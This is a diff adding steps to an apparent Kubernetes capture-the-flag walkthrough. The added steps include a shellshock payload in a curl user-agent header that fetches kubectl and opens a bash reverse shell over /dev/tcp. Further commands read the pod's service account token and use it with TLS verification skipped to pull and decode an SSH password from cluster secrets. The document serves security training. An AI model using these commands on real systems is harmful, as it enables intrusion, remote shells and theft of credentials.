@@ -82,6 +82,8 @@ nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
 nmap-kube-discover
 ```
 
+Part 1: compromise via shellshock
+
 Useful commands for finding open ports:
 
 ```
@@ -121,4 +123,47 @@ command nmap -Pn -T4 --open <host-ip> -p 30081
 
    ```
    while :; do curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "test -f /tmp/k || wget -O /tmp/k https://storage.googleapis.com/kubernetes-release/release/v1.11.2/bin/linux/amd64/kubectl && chmod +x /tmp/k && /tmp/k version; df -h; while :; do nohup bash -i >& /dev/tcp/<host_ip>/1234 0>&1; sleep 1; done"'; done
+   ```
+
+Part 2: 
+
+Kubectl SA: steal secret with ssh password in (flag)
+
+### Steps
+
+1. on the control server, or via individual shellshock commands:
+
+   Search for secrets:
+
+   ```
+   df -h
+   cat /run/secrets/kubernetes.io/serviceaccount/token; echo 
+   
+   /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify get  nodes
+   
+   /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify auth can-i get secrets --namespace kube-system   
+   ```
+
+2. pull secrets from the API server for this namespace (there's a service account mounted that can read kube-system)
+
+   ```
+   /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify get secrets -n shellshock
+   ```
+
+3. we've found secrets, now decode them
+
+   > first way requires manual base64 decode, second is a one-liner
+
+   ```
+    /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --request-timeout 5s  --server https://kubernetes.default.svc --insecure-skip-tls-verify get secret my-secret -o yaml -n shellshock 
+   
+    /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify get secret my-secret -n shellshock -o 'go-template={{index .data "ssh_password"}}' | base64 -d; echo
+   ```
+
+4. find password for ssh server in flag
+
+5. write password in local file to win (or just tell ControlPlane!) TODO(low): write test for this
+
+   ```
+   echo 'What kind of plane is it?' > /tmp/flag
    ```
